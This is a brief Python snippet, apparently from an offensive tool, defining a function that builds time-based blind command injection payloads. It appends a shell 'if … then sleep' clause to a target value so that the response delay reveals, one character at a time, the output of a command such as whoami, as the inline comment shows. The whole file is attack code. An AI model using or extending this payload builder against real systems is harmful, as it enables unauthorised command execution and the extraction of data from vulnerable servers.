from operator import itemgetter
def create_payload(data):
    target,command,current_len,current_key,global_delay_sec = data.values()
    # if [ $(whoami | xargs | cut -c 1) = "s" ]; then sleep 10; fi
    payload = target + 'if [ "$(%s | xargs | cut -c %s)" = "%s" ];' %(command, current_len, current_key) + " then sleep %s; fi" %(global_delay_sec)
    return payload